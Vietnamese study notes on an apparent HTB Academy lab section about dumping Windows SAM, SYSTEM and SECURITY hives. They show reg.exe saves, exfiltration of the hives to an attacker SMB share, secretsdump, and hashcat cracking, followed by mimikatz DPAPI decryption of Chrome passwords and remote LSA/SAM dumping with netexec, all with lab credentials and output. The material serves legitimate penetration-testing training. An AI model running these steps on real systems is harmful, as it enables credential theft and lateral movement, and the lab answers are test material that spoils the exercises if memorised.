# Attacking SAM, SYSTEM, and SECURITY

> HTB Academy — Module 147 / Section 11 of 26

Với quyền quản trị (administrative access) trên hệ thống Windows, ta có thể dump nhanh các file liên quan đến cơ sở dữ liệu SAM, chuyển chúng về máy tấn công (attack host), và bắt đầu crack hash offline. Thực hiện offline cho phép ta tiếp tục tấn công mà không cần duy trì session hoạt động với target.

---

## Registry hives

Có ba registry hive ta có thể copy khi có quyền local administrator trên target, mỗi hive phục vụ một mục đích riêng trong việc dump và crack password hash:

| Registry Hive | Mô tả |
|---|---|
| `HKLM\SAM` | Chứa password hash của các tài khoản người dùng cục bộ. Những hash này có thể được trích xuất và crack để lộ ra mật khẩu dạng plaintext. |
| `HKLM\SYSTEM` | Lưu system boot key — khóa dùng để mã hóa cơ sở dữ liệu SAM. Khóa này là bắt buộc để giải mã các hash. |
| `HKLM\SECURITY` | Chứa thông tin nhạy cảm mà Local Security Authority (LSA) sử dụng, gồm cached domain credentials (DCC2), mật khẩu cleartext, khóa DPAPI, và nhiều thứ khác. |

Ta có thể back up các hive này bằng tiện ích `reg.exe`.

---

## Dùng reg.exe để copy registry hives

Mở `cmd.exe` với quyền quản trị, dùng `reg.exe` để lưu bản copy của các hive:

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Nếu chỉ cần dump hash của local user, ta chỉ cần `HKLM\SAM` và `HKLM\SYSTEM`. Tuy nhiên, thường nên lưu thêm `HKLM\SECURITY`, vì trên hệ thống đã join domain nó có thể chứa cached domain credentials cùng nhiều dữ liệu giá trị khác.

---

## Tạo share bằng smbserver

Dùng Impacket's `smbserver` để chuyển các file hive về máy tấn công. Chạy `smbserver.py -smb2support`, đặt tên share (vd: `CompData`), và trỏ tới thư mục cục bộ nơi sẽ lưu các bản copy.

Cờ `-smb2support` đảm bảo tương thích với các phiên bản SMB mới hơn. Nếu không có cờ này, Windows mới có thể không kết nối được vì SMBv1 bị tắt mặc định do có nhiều lỗ hổng nghiêm trọng và exploit công khai.

```shellsession
naruto3co@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

---

## Chuyển các bản hive về share

Trên target Windows, dùng lệnh `move` để chuyển các file hive vào share:

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.
C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.
C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Xác nhận trên máy tấn công:

```shellsession
naruto3co@htb[/htb]$ ls
sam.save  security.save  system.save
```

---

## Dumping hashes với secretsdump

Impacket's `secretsdump` là công cụ hữu ích để dump hash offline. Kiểm tra xem đã cài chưa:

```shellsession
naruto3co@htb[/htb]$ locate secretsdump
```

Chạy script và chỉ định từng file hive đã lấy từ target:

```shellsession
naruto3co@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d...
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c...
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59...
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6a...
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503...
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d56...
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781...
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a4...
[*] Cleaning up...
```

Bước đầu tiên `secretsdump` thực hiện là lấy **system bootkey** trước khi dump local SAM hashes. Điều này cần thiết vì bootkey được dùng để mã hóa/giải mã cơ sở dữ liệu SAM — thiếu nó thì không giải mã được hash, đó là lý do việc có bản copy của các registry hive là rất quan trọng.

Dòng dưới đây cho biết cách đọc output:

```shellsession
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Hầu hết Windows hiện đại lưu mật khẩu dưới dạng **NT hashes**. Hệ thống cũ (trước Windows Vista / Server 2008) có thể lưu dưới dạng **LM hashes** — yếu hơn và dễ crack hơn.

---

## Cracking hashes với Hashcat

Đưa các NT hash vào file text:

```shellsession
naruto3co@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

### Chạy Hashcat với NT hashes

Dùng cờ `-m` để chỉ định hash type `1000` (NT hash, còn gọi là NTLM-based hash):

```shellsession
naruto3co@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian
31d6cfe0d16ae931b73c59d7e0c089c0:

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Recovered........: 5/5 (100.00%) Digests
```

Việc có mật khẩu này rất hữu ích — vd có thể thử dùng credential đã crack để truy cập các hệ thống khác trên mạng (rất phổ biến việc user tái sử dụng password).

> **Lưu ý:** Đây là kỹ thuật đã được biết đến rộng rãi, admin có thể đã triển khai các biện pháp phát hiện/ngăn chặn. Nhiều chiến lược detection và mitigation được ghi trong MITRE ATT&CK framework.

---

## DCC2 hashes

`hklm\security` chứa cached domain logon information dưới dạng **DCC2 hashes** — bản hash cục bộ của network credential hash. Ví dụ:

```text
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813...
```

Loại hash này khó crack hơn NT hash nhiều vì dùng **PBKDF2**. Ngoài ra nó không dùng được cho lateral movement với Pass-the-Hash. Hashcat mode để crack DCC2 là `2100`.

```shellsession
naruto3co@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>
$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
Speed.#1.........: 5536 H/s
Recovered........: 1/1 (100.00%) Digests
```

Chú ý tốc độ crack **5536 H/s**. Trên cùng máy đó, NTLM crack ở **4605.4 kH/s** — tức DCC2 chậm hơn khoảng **800 lần**. Con số phụ thuộc nhiều vào phần cứng, nhưng điểm mấu chốt: mật khẩu mạnh thường không thể crack trong khung thời gian pentest thông thường.

---

## DPAPI

Ngoài DCC2 hash, ta còn thấy machine key và user key của **DPAPI** được dump từ `hklm\security`. Data Protection Application Programming Interface (DPAPI) là bộ API trong Windows dùng để mã hóa/giải mã data blob theo từng user. Các blob này được nhiều tính năng Windows và ứng dụng bên thứ ba sử dụng.

| Applications | Cách dùng DPAPI |
|---|---|
| Internet Explorer | Dữ liệu auto-complete form password (username & password cho các site đã lưu). |
| Google Chrome | Dữ liệu auto-complete form password (username & password cho các site đã lưu). |
| Outlook | Password cho các tài khoản email. |
| Remote Desktop Connection | Credential đã lưu cho kết nối tới máy remote. |
| Credential Manager | Credential đã lưu để truy cập shared resource, join WiFi, VPN và nhiều thứ khác. |

Credential mã hóa bằng DPAPI có thể giải mã thủ công bằng Impacket's `dpapi`, `mimikatz`, hoặc remote bằng `DonPAPI`.

```cmd
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
  * using CryptUnprotectData API
> AES Key is:
efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL      : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
  * using BCrypt with AES-256-GCM
Password: April2025!
```

---

## Remote dumping & LSA secrets

Với credential có quyền **local administrator**, ta cũng có thể target LSA secrets qua mạng — cho phép trích xuất credential từ running service, scheduled task, hoặc ứng dụng lưu password bằng LSA secrets.

### Dump LSA secrets từ xa

```shellsession
naruto3co@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB  10.129.42.198  445  WS01  [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB  10.129.42.198  445  WS01  [+] WS01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB  10.129.42.198  445  WS01  [+] Dumping LSA secrets
SMB  10.129.42.198  445  WS01  WS01\worker:Hello123
SMB  10.129.42.198  445  WS01  dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
                               dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB  10.129.42.198  445  WS01  NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c...
SMB  10.129.42.198  445  WS01  [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/...
```

### Dump SAM từ xa

```shellsession
naruto3co@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB  10.129.42.198  445  WS01  [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB  10.129.42.198  445  WS01  [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB  10.129.42.198  445  WS01  [+] Dumping SAM hashes
SMB  10.129.42.198  445  WS01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d...
SMB  10.129.42.198  445  WS01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c...
SMB  10.129.42.198  445  WS01  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59...
SMB  10.129.42.198  445  WS01  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5...
SMB  10.129.42.198  445  WS01  bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58
SMB  10.129.42.198  445  WS01  sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc
SMB  10.129.42.198  445  WS01  rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e23...
SMB  10.129.42.198  445  WS01  worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fd...
SMB  10.129.42.198  445  WS01  [+] Added 8 SAM hashes to the database
```

---

## Câu hỏi thực hành

1. **Q1** — SAM database nằm ở đâu trong Windows registry? (Format: `****\***`)
2. **Q2** — Áp dụng kỹ thuật trong section để lấy password của tài khoản `ITbackdoor`. Nộp clear-text password.
   - *Hint:* Dump SAM (SAM/SYSTEM), crack NT hash bằng Hashcat mode 1000.
3. **Q3** — Dump LSA secrets trên target và tìm credential được lưu. Nộp theo format `username:password` (Case-Sensitive).

> RDP tới target với user `Bob` / password `HTB_@cademy_stdnt!`

---

